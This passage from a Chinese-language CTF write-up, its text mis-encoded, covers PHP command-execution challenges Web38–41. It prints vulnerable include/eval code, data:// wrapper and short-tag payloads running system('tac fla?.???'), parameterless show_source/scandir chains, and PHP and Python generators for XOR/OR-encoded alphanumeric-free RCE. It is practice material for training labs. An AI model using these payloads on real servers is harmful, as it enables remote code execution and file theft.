class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ç›¸è¾ƒäºä¸Šä¸€ä¸ªé¢˜å¤šè¿‡æ»¤äº†ä¸€å±‚ phpï¼Œä½¿ç”¨ base64 ç»•è¿‡å°±è¡Œï¼š</p><blockquote><p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><p>â€‹æˆ–è€…ï¼Œä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š</p><blockquote><p>?c=data://text/plain,<?= system("tac fla?.???");?></p></blockquote><h1 id="web39"><a class="markdownIt-Anchor" href="#web39">#</a> Web39ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† flagï¼Œä½†æ˜¯æ–‡ä»¶åŒ…å«é‡Œå­˜åœ¨.php çš„åç¼€ï¼Œå¥½åƒæ— ä¼¤å¤§é›…ï¼Œå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼ŒçŸ­æ ‡ç­¾æ‰“ã€‚</p><blockquote><p>/?c=data://text/plain,<?= system("tac fla?.???");?></p></blockquote><p>â€‹ç”±äºä¸¤ç«¯åˆåœ¨ä¸€èµ·å°±ç±»ä¼¼äº <code>&lt;?= system('tac fla*');?&gt;.php</code> ï¼Œ.php å› ä¸ºå·²ç»è¢«æ ‡ç­¾é—­åˆåœ¨å¤–é¢ï¼Œæ‰€ä»¥ä¸ä¼šè¢«å½“ä½œæ–‡ä»¶åŒ…å«çš„åç¼€ç®—è¿›å»ï¼Œä¾æ—§èƒ½è¿›è¡Œ RCEã€‚</p><h1 id="web40"><a class="markdownIt-Anchor" href="#web40">#</a> Web40ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†æ•°å­—ï¼Œå’Œå„ç§ç¬¦å·ï¼Œä½†æ˜¯è¿‡æ»¤ä¼¼ä¹æœ‰ç‚¹å„¿é—®é¢˜ï¼Œæ²¡æœ‰è¿‡æ»¤è‹±æ–‡çš„æ‹¬å·ï¼Œè¿‡æ»¤æˆäº†ä¸­æ–‡çš„æ‹¬å·ï¼Œæ‰€ä»¥ï¼Œæ— å‚æ•° RCEï¼Œå¯ä»¥ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>â€‹å‰ç½®çŸ¥è¯†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localeconv</span>()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å·(.)</span><br><span class="line"><span class="title function_ invoke__">current</span>() ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ï¼›é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</span><br><span class="line"><span class="title function_ invoke__">pos</span>()ï¼š<span class="title function_ invoke__">current</span>() çš„åˆ«å</span><br><span class="line"><span class="title function_ invoke__">reset</span>() å°† <span class="keyword">array</span> çš„å†…éƒ¨æŒ‡é’ˆå€’å›åˆ°ç¬¬ä¸€ä¸ªå•å…ƒå¹¶è¿”å›ç¬¬ä¸€ä¸ªæ•°ç»„å•å…ƒçš„å€¼ã€‚</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()ï¼šæ•°ç»„é€†åº</span><br><span class="line">(å¦‚æœä¸æ˜¯æ•°ç»„çš„æœ€åä¸€ä¸ªæˆ–è€…å€’æ•°ç¬¬äºŒä¸ªå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>())ï¼Œ<span class="title function_ invoke__">array_flip</span>()æ˜¯äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼ï¼Œ<span class="title function_ invoke__">array_rand</span>()æ˜¯éšæœºè¿”å›ä¸€ä¸ªæ•°ç»„)</span><br><span class="line"><span class="title function_ invoke__">scandir</span>()ï¼šåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•</span><br><span class="line"><span class="title function_ invoke__">next</span>()ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½å³æŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºè¿™ä¸ªå…ƒç´ ã€‚</span><br></pre></td></tr></table></figure><p>â€‹æˆ–è€…ä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶</span><br><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)));</span><br><span class="line">æ‰¾åˆ°flag.php</span><br><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line">é«˜äº®æ˜¾ç¤ºå³å¯</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br></pre></td></tr></table></figure><h1 id="web41"><a class="markdownIt-Anchor" href="#web41">#</a> Web41ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æ— å­—æ¯æ•°å­— RCEï¼Œå¹¶ä¸”å› ä¸ºè¿‡æ»¤äº† $ã€+ã€-ã€^ã€~ æ‰€ä»¥æ— æ³•ä½¿ç”¨å¼‚æˆ–ã€è‡ªå¢å’Œå–åç»•è¿‡ï¼Œä¸è¿‡ï¼Œå¬è¯´ç½‘ä¸Šè¿˜æœ‰å¦ä¸€ä¸ªæ“ä½œï¼Œå°±æ˜¯åˆ©ç”¨ç®¡é“ç¬¦ï¼Œä¹Ÿå°±æ˜¯ | è¿ç®—ç¬¦ï¼Œè¿™é‡Œè´´ä¸€ä¸‹ç›¸å…³çš„æ–‡ç« ï¼š</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA5MTQzNDEzP29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyMTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0LnBjJTI1NUZibG9nLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5ibG9nfmZpcnN0X3JhbmtfdjJ+cmFua192MjktMS0xMDkxNDM0MTMucGNfdjJfcmFua19ibG9nX2RlZmF1bHQmYW1wO3V0bV90ZXJtPSVFNSU4RiU5NiVFNSU4RiU4RCZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQ0NTA=">æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“ï¼ˆå«ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ã€å¼‚æˆ–ã€æˆ–ã€å–åã€è‡ªå¢è„šæœ¬ï¼‰</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA4NTY5MDgw">ctfshow web å…¥é—¨ web41</span></p><p>â€‹è¿™é‡Œç»™äº†ä¸¤ä¸ªä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>; <span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¿˜æœ‰ python çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><p>â€‹å¦ä¸€ä¸ªï¼Œè´´ä¸€ä¸‹ç¾½ç¥çš„è„šæœ¬ï¼Œè¿™ä¸ªæ„Ÿè§‰æ›´å¥½ç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USERï¼špython exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;egï¼š  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span 